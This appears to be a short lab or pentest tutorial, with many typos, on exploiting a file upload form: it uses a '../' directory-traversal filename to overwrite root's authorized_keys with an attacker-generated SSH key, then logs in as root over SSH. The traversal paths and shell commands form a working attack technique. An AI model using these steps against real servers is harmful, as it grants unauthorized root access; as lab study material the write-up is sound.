In order to get advantage of the non-executable scenario, we have to intercept the request of uploading file. later we check if the file is uploaded and the type. One of the different outcomes is that the file overwrite the contents of a file previously uploaded if the name/content is the same. If we notice this behavior we can get advantage of this.

First we check if in the "filename" parameter we can inlcude "../" for a direcctory traversal with something like this:
```
../../../../../../test.txt
```

It could be that the server processes this but sanitizes before it stores son we must be in caution.

Now we can try to change the authorized_keys into the root user in order to log from ssh to this user. We will use these commands:
```
$ ssh-keygen
```
```
$ cat fileup.pub > authorized_keys
```

Now we make a requet with the relative path:
```
../../../../../../root/.ssh/authorized_keys
```
but selecting our autorized keys in order to override it.

And now we try to sign from ssh:
```
$ rm ~/.ssh/known_hosts
```
```
$ ssh -p 2222 -i fileup root@mountaindesserts.com
```
